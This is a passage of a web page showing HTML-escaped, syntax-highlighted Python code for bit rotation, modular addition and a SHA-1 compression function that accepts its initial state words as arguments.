&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;lmask
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    r &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;rmask
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    newl &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;r &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;amp;lt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    newr &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;32&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;n)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;newl &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;newr
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;add&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;l&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;l:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(ret &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;e) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;top
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ret
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1_impl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h3&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;h4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(msg) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;#x2F; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;))&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        chunk &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;msg[j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: (j&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        w &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;xrange&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            word &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;chunk[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: (i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;4&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            (w[i],) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;struct.unpack(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;gt;i&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, word)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;80&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            w[i] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rotl((w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;3&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;14&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;w[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;]) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;top, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        a &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h2
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h3
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;h4
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;80&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;19&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;~ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x5A827999
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;20 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;39&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x6ED9EBA1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;40 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;59&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x8F1BBCDC
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;elif &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;60 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;79&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
